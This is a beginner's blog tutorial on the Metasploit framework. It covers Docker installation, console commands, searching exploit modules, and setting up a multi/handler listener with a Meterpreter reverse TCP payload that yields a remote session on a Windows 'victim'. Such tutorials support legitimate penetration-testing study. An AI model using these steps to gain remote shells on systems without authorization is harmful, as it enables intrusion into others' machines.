---
layout: post
title: Metasploit Quickstart Guide
date: 2017-03-26
tags: Tech Metasploit Security Quickstart Tutorial
categories: Tech Tutorial Metasploit
---

This guide is created by a beginner for beginners and designed to help you get familiar with the 
<a href="https://metasploit.com" target="_blanl">Metasploit</a> framework as quickly as possible.

At the end of this post, I am providing a list of great <a href="#resources">resources</a> to be used as references when using Metasploit. I find those resources to be great references for someone who already knows what they are looking for. However, by focusing mostly on explaining the terminology and steps of penetration testing, they kinda fail to provide a clear organized roadmap to help a beginner like myself understand the ins and outs of Metasploit, which encouraged me to write this guide.

In this step-by-step guide, we will skip terminology and penetration testing steps (as they are already very well covered in other <a href="#resources">resources</a>) and we will jump directly into exploring the Metasploit framework from installation to exploitation.

# Installing Metasploit
The easiest way to start using Metasploit right away without needing to install Metasploit on your machine is to use 
the official <a href="https://store.docker.com/community/images/kalilinux/kali-linux-docker" target ="_blank">Kali Linux Docker container</a>. 
You don't need to have experience with <a href="https://www.docker.com/" target="_blank">Docker</a>, 
but you will need to have it installed on your machine from the 
<a href="https://store.docker.com/search?offering=community&type=edition" target="_blank">Docker Store</a>. If you prefer to install Metasploit on your machine, you can follow the instructions <a href="https://help.rapid7.com/metasploit/Content/installation-and-updates/installing-msf.html" target="_blank">here</a>.

To start the Docker container and install Metasploit, use the following commands:
```
$ docker run -it kalilinux/kali-linux-docker bash
root@0129d62d2319:/# apt-get install -y metasploit
```
To avoid installing Metasploit every time you start the container, 
you may need to use a Kali Linux container with Metasploit installed like 
<a href="https://store.docker.com/community/images/linuxkonsult/kali-metasploit" target="_blank">this one</a><a href="#disclaimer"><sup>*</sup></a>, in which case, 
you would use the following commands instead:
```
$ docker run -it linuxkonsult/kali-metasploit
root@0129d62d2319:/# msfupdate
```
> <span id="disclaimer"><sup>*</sup></span> **Disclaimer**: This is NOT an official Kali Linux image and was not tested by the author. 
Use at your own responsibility.

## Initial Setup

On your Docker container, run the following commands to start the PostreSQL database server used by the Metasploit framework, then start the console:
```
service postgresql start
msfdb init
msfconsole
```
# Exploring Metasploit

To get more familiar with the Metasploit framework, let's start by checking its commands. 
I am highlighting the 
<a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands" target="_blank">
most commonly used commands</a> and we will go over some of them as we move forward.
```
msf> help
```
<pre><code>
Core Commands
=============
    Command       Description
    -------       -----------
    ?             Help menu
    <b>advanced      Displays advanced options for one or more modules</b>
    <b>back          Move back from the current context</b>
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    edit          Edit the current module with $VISUAL or $EDITOR
    <b>exit          Exit the console</b>
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    <b>help          Help menu</b>
    <b>info          Displays information about one or more modules</b>
    irb           Drop into irb scripting mode
    <b>jobs          Displays and manages jobs</b>
    <b>kill          Kill a job</b>
    <b>load          Load a framework plugin</b>
    loadpath      Searches for and loads modules from a path
    makerc        Save commands entered since start to a file
    <b>options       Displays global options or for one or more modules</b>
    ...
    <b>search        Searches module names and descriptions</b>
    sess          Interact with a given session
    <b>sessions      Dump session listings and display information about sessions</b>
    <b>set           Sets a context-specific variable to a value</b>
    <b>setg          Sets a global variable to a value</b>
    <b>show          Displays modules of a given type, or all modules</b>
    ...
    <b>unset         Unsets one or more context-specific variables</b>
    unsetg        Unsets one or more global variables
    <b>use           Selects a module by name</b>
    version       Show the framework and console library version numbers
...
</code></pre>

To learn more about one of the commands, e.g. `search`, we can simply use `help search` or `search -h`:
```
msf> help search
```
```
Usage: search [keywords]

Keywords:
  app       :  Modules that are client or server attacks
  author    :  Modules written by this author
  bid       :  Modules with a matching Bugtraq ID
  cve       :  Modules with a matching CVE ID
  edb       :  Modules with a matching Exploit-DB ID
  name      :  Modules with a matching descriptive name
  platform  :  Modules affecting this platform
  ref       :  Modules with a matching ref
  type      :  Modules of a specific type (exploit, auxiliary, or post)

Examples:
  search cve:2009 type:exploit app:client
```
As we can see, the search command searches modules by name, type, platform, ...

## Searching for exploit
Now, let's say we would like to search for an **exploit** module to run against a **windows** machine:
```
msf> search type:exploit platform:windows
```
```
Matching Modules
================

   Name                                                                   Disclosure Date  Rank       Description
   ----                                                                   ---------------  ----       -----------
   ...
   exploit/multi/browser/mozilla_compareto                                2005-07-13       normal     Mozilla Suite/Firefox compareTo() Code Execution
   exploit/multi/browser/mozilla_navigatorjava                            2006-07-25       normal     Mozilla Suite/Firefox Navigator Object Code Execution
   exploit/multi/browser/qtjava_pointer                                   2007-04-23       excellent  Apple QTJava toQTPointer() Arbitrary Memory Access
   exploit/multi/fileformat/adobe_u3d_meshcont                            2009-10-13       good       Adobe U3D CLODProgressiveMeshDeclaration Array Overrun
   exploit/multi/fileformat/maple_maplet                                  2010-04-26       excellent  Maple Maplet File Creation and Command Execution
   exploit/multi/fileformat/office_word_macro                             2012-01-10       excellent  Microsoft Office Word Malicious Macro Execution
   exploit/multi/fileformat/peazip_command_injection                      2009-06-05       excellent  PeaZip Zip Processing Command Injection
   exploit/multi/handler                                                                   manual     Generic Payload Handler
   ...
   exploit/windows/browser/yahoomessenger_server                          2007-06-05       good       Yahoo! Messenger 8.1.0.249 ActiveX Control Buffer Overflow
   exploit/windows/browser/zenturiprogramchecker_unsafe                   2007-05-29       excellent  Zenturi ProgramChecker ActiveX Control Arbitrary File Download
   exploit/windows/browser/zenworks_helplauncher_exec                     2011-10-19       normal     AdminStudio LaunchHelp.dll ActiveX Arbitrary Code Execution
   exploit/windows/dcerpc/ms03_026_dcom                                   2003-07-16       great      MS03-026 Microsoft RPC DCOM Interface Overflow
   exploit/windows/dcerpc/ms05_017_msmq                                   2005-04-12       good       MS05-017 Microsoft Message Queueing Service Path Overflow
   exploit/windows/dcerpc/ms07_029_msdns_zonename                         2007-04-12       great      MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (TCP)
   exploit/windows/dcerpc/ms07_065_msmq                                   2007-12-11       good       MS07-065 Microsoft Message Queueing Service DNS Name Path Overflow
   exploit/windows/email/ms07_017_ani_loadimage_chunksize                 2007-03-28       great      Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)
   exploit/windows/email/ms10_045_outlook_ref_only                        2010-06-01       excellent  Outlook ATTACH_BY_REF_ONLY File Execution
   exploit/windows/email/ms10_045_outlook_ref_resolve                     2010-06-01       excellent  Outlook ATTACH_BY_REF_RESOLVE File Execution
   exploit/windows/emc/alphastor_agent                                    2008-05-27       great      EMC AlphaStor Agent Buffer Overflow
   exploit/windows/emc/alphastor_device_manager_exec                      2013-01-18       excellent  EMC AlphaStor Device Manager Opcode 0x75 Command Injection
   exploit/windows/emc/networker_format_string                            2012-08-29       normal     EMC Networker Format String
   exploit/windows/emc/replication_manager_exec                           2011-02-07       great      EMC Replication Manager Command Execution
   exploit/windows/fileformat/a_pdf_wav_to_mp3                            2010-08-17       normal     A-PDF WAV to MP3 v1.0.0 Buffer Overflow
   exploit/windows/fileformat/abbs_amp_lst                                2013-06-30       normal     ABBS Audio Media Player .LST Buffer Overflow
   exploit/windows/fileformat/acdsee_fotoslate_string                     2011-09-12       good       ACDSee FotoSlate PLP File id Parameter Overflow
   exploit/windows/fileformat/acdsee_xpm                                  2007-11-23       good       ACDSee XPM File Section Buffer Overflow
   exploit/windows/fileformat/actfax_import_users_bof                     2012-08-28       normal     ActiveFax (ActFax) 4.3 Client Importer Buffer Overflow
   exploit/windows/fileformat/activepdf_webgrabber                        2008-08-26       low        activePDF WebGrabber ActiveX Control Buffer Overflow
   exploit/windows/fileformat/adobe_collectemailinfo                      2008-02-08       good       Adobe Collab.collectEmailInfo() Buffer Overflow
   exploit/windows/fileformat/adobe_cooltype_sing                         2010-09-07       great      Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow
   exploit/windows/fileformat/adobe_flashplayer_button                    2010-10-28       normal     Adobe Flash Player "Button" Remote Code Execution
   ...
```
As we can see, the name of the module is divided into 4 fields specifying the module type, target platform, target application category, and target system vulnerability, respectively. The filter we are using in our search is only showing modules of type `exploit` for `windows` or `multi` platforms. 

To get more details about one of the exploits, we can use `info <exploit name>`, or <a href="https://www.rapid7.com/db/search" target="_blank">search the Rapid7 vulnerability and exploit database</a> by module name.

## Using an exploit
One of the most commonly used exploits is the `exploit/multi/handler`. This exploit does not target any specific system vulnerability but rather handles connections initiated from the victim machine. We will be using this exploit:
```
msf> use exploit/multi/handler
```
By selecting a module, we have switched from the global context to that module context. By typing `help`, we can see that a list of `Exploit Commands` are now added to the list of available commands:

```
...
Exploit Commands
================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Launch an exploit attempt
    pry           Open a Pry session on the current module
    rcheck        Reloads the module and checks if the target is vulnerable
    reload        Just reloads the module
    rerun         Alias for rexploit
    rexploit      Reloads the module and launches an exploit attempt
    run           Alias for exploit
```
Typically, we would need to know the `options` of the selected module:
```
msf exploit(handler) > options 
```
```
Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```
The `handler` module does not have any options of its own.

Additionally, we might want to check the `advanced` options of the module: 
```
msf exploit(handler) > advanced
```
```
Module advanced options (exploit/multi/handler):

   Name                    Current Setting  Required  Description
   ----                    ---------------  --------  -----------
   ContextInformationFile                   no        The information file that contains context information
   DisablePayloadHandler   false            no        Disable the handler code for the selected payload
   EnableContextEncoding   false            no        Use transient context when encoding payloads
   ExitOnSession           true             no        Return from the exploit after a session has been created
   ListenerTimeout         0                no        The maximum number of seconds to wait for new sessions
   VERBOSE                 false            no        Enable detailed status messages
   WORKSPACE                                no        Specify the workspace for this module
   WfsDelay                0                no        Additional delay when waiting for a session

```
## Finding compatible payloads
To start an attack, we need to know which payloads can be used with this exploit:
```
msf exploit(handler) > show payloads 
```
```
Compatible Payloads
===================

   Name                                                Disclosure Date  Rank    Description
   ----                                                ---------------  ----    -----------
   ...
   windows/meterpreter/reverse_tcp                                      normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager
   windows/meterpreter/reverse_tcp_allports                             normal  Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
   windows/meterpreter/reverse_tcp_dns                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
   windows/meterpreter/reverse_tcp_rc4                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   windows/meterpreter/reverse_tcp_rc4_dns                              normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   windows/meterpreter/reverse_tcp_uuid                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
   windows/meterpreter/reverse_winhttp                                  normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
   windows/meterpreter/reverse_winhttps                                 normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (winhttp)
   ...
   windows/shell/bind_tcp                                               normal  Windows Command Shell, Bind TCP Stager (Windows x86)
   windows/shell/bind_tcp_rc4                                           normal  Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)
   windows/shell/bind_tcp_uuid                                          normal  Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)
   windows/shell/reverse_ipv6_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (IPv6)
   windows/shell/reverse_nonx_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (No NX or Win7)
   windows/shell/reverse_ord_tcp                                        normal  Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
   windows/shell/reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Stager
   ...
```
The list above shows a subset of the payloads that can be used with the `handler` module for a windows machine. 

A `shell` payload returns a windows shell on the remote (victim) machine on successful attack. A <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter" target="_blank">`meterpreter`</a> payload, on the other hand, would return a meterpreter session, which is very powerful tool that allows you to do many operations on the remote machine and its network. We will discuss Meterpreter sessions in more details in a future post.

A `reverse_tcp` payload starts a TCP server on the Kali box for the victim machine to connect to. Similary, `reverse_http` and `reverse_https` starts HTTP and HTTPS servers respectively.

## Setting the payload
For our attack, we choose the `windows/meterpreter/reverse_tcp`:
```
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
```
```
PAYLOAD => windows/meterpreter/reverse_tcp
```
Now, let's check the `options` of the selected payload:
```
msf exploit(handler) > options 
```
```
...

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port


...
```
We need to set the local host (`LHOST`) address because it's a required option. We may also want to set the listening port (`LPORT`).
```
msf exploit(handler) > set LHOST 192.168.1.15
```
```
LHOST => 192.168.1.15
```
```
msf exploit(handler) > set LPORT 8080
```
```
LPORT => 8080
```
```
msf exploit(handler) > options
```
<pre><code>
...
Payload options (windows/meterpreter/reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DebugOptions  0                no        Debugging options for POSIX meterpreter
   <b>LHOST         192.168.1.15     yes       The listen address</b>
   <b>LPORT         8080             yes       The listen port</b>
</code></pre>
## Running the exploit
We can now run the exploit using `run` or `exploit`. To start the exploit as a background job, we use the `-j` option. You may want to use `help run` to see other options of the `run`/`exploit` command.
```
msf exploit(handler) > run -j
```
```
[*] Exploit running as background job.
[*] Started reverse TCP handler on 192.168.1.15:8080 
[*] Starting the payload handler...
```
We now have a server running on our Kali box at `192.168.1.15` listening at port `8080`.
> **Note**: If you are getting an SSL error at this point, you may need to follow these directions from the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode" target="_blank">Metasploit Framework Wiki</a>

To check the running job(s), use `jobs -l`, or simply `jobs`:
```
msf exploit(handler) > jobs
```
```
Jobs
====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.1.15:8080
```
We can see our job running with ID `0`. When we are ready to end the job and kill the server, we use `kill <job id>` or `jobs -k <job id>`, but we are not ready to end our job just yet. 

The next step is waiting until the victim connects to our server, at which point the meterpreter session would automatically start:
```
[*] Meterpreter session 1 opened (192.168.1.15:8080 -> 192.168.1.10:53235) at 2017-03-26 
```
We use `sessions` or `sessions -l` to list the active sessions:
```
msf exploit(handler) > sessions
```
```
Active Sessions
===============

  Id  Type                      Information                 Connection
  --  ----                      -----------                 ----------
  1   meterpreter x86/windows   xyz/Administrator @ xyz     192.168.1.15:8080 -> 192.168.1.10:53235

```
To join the newly created session:
```
msf exploit(handler) > sessions -i 1
```
```
meterpreter > 
```
We have now switched to the meterpreter context which has completely different commands than the module and the global context of `msfconsole`. To check the meterpreter commands, try:
```
meterpreter > help
```
Congratulations! You have just exploited your first Windows machine. In a future post, we will explore the power of Meterpreter.
# <span id="resources">Resources</span>

**To learn more**:
- <a href="https://www.offensive-security.com/metasploit-unleashed" target="_blank">Metasploit Unleashed</a>
- <a href="http://www.nostarch.com/metasploit" target="_blank">Metasploit - The Penetration Tester's Guide</a>
- <a href="https://github.com/rapid7/metasploit-framework/wiki" target="_blank">Metasploit Framework Wiki</a>
- <a href="http://resources.metasploit.com" target="_blank">Metasploit External Resource Portal</a>

**To get help**:
- <a href="https://community.rapid7.com/community/metasploit" target="_blank">Rapid7 Community</a>
- <a href="https://security.stackexchange.com/questions/tagged/metasploit" target= "_blank">Information Security - Stack Exchange</a>

**To search for vulnerabilities/exploits**:
- <a href="https://www.rapid7.com/db/search" target ="_blank">Rapid7 Vulnerability and Exploit Database</a>
- <a href="https://www.exploit-db.com/search" target="_blank">Exploit Database</a>
